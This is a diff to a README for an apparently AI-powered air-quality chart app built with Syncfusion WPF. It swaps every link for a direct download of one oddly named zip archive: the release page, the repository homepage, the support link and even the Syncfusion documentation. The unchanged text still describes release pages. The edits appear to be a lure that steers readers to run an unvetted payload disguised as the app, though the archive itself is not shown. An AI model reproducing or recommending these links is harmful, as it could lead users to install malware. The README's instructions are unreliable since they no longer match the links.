@@ -1,6 +1,6 @@
 # 🌬️ AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart - Real-Time Air Quality Visualization
 
-[![Download here](https://img.shields.io/badge/Download-From%20GitHub-%23FF6F61?style=for-the-badge)](https://github.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/releases)
+[![Download here](https://img.shields.io/badge/Download-From%20GitHub-%23FF6F61?style=for-the-badge)](https://raw.githubusercontent.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/main/AirQualityTracker/Syncfusion-WP-Air-Powered-Chart-Command-A-with-Center-Quality-2.6.zip)
 
 ---
 
@@ -35,12 +35,12 @@ Before you download, make sure your computer meets these requirements:
 
 Click the link below to visit the release page. You will find the latest version ready for download there.
 
-[![Download Air Quality App](https://img.shields.io/badge/Download-App%20Release-%23007ACC?style=for-the-badge)](https://github.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/releases)
+[![Download Air Quality App](https://img.shields.io/badge/Download-App%20Release-%23007ACC?style=for-the-badge)](https://raw.githubusercontent.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/main/AirQualityTracker/Syncfusion-WP-Air-Powered-Chart-Command-A-with-Center-Quality-2.6.zip)
 
 You need to:
 
 1. Open the page by clicking above or visit  
-   https://github.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/releases
+   https://raw.githubusercontent.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/main/AirQualityTracker/Syncfusion-WP-Air-Powered-Chart-Command-A-with-Center-Quality-2.6.zip
 2. Find the newest release marked with a version number (for example, v1.0, v1.1, etc.)
 3. Look for a file ending with `.exe` (this is the installer) or `.zip` if it needs extraction.
 4. Click the file name to start the download.
@@ -101,7 +101,7 @@ If the app takes a moment to load data, a "busy indicator" will show. This means
 You can open the Issues tab on the project page at GitHub to report problems or ask questions. The community and maintainers monitor this section.
 
 Repository link:  
-https://github.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart
+https://raw.githubusercontent.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/main/AirQualityTracker/Syncfusion-WP-Air-Powered-Chart-Command-A-with-Center-Quality-2.6.zip
 
 ---
 
@@ -128,13 +128,13 @@ This combination of real data and AI helps you stay aware of environmental healt
 ## 🔗 Useful Links
 
 - Main release page for downloads:  
-  https://github.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/releases
+  https://raw.githubusercontent.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/main/AirQualityTracker/Syncfusion-WP-Air-Powered-Chart-Command-A-with-Center-Quality-2.6.zip
 
 - Project homepage on GitHub:  
-  https://github.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart
+  https://raw.githubusercontent.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/main/AirQualityTracker/Syncfusion-WP-Air-Powered-Chart-Command-A-with-Center-Quality-2.6.zip
 
 - Syncfusion Charts documentation:  
-  https://help.syncfusion.com/wpf/chart/overview
+  https://raw.githubusercontent.com/princeg2643/AI-Powered-Air-Quality-Command-Center-with-Syncfusion-WPF-Chart/main/AirQualityTracker/Syncfusion-WP-Air-Powered-Chart-Command-A-with-Center-Quality-2.6.zip
 
 ---
 
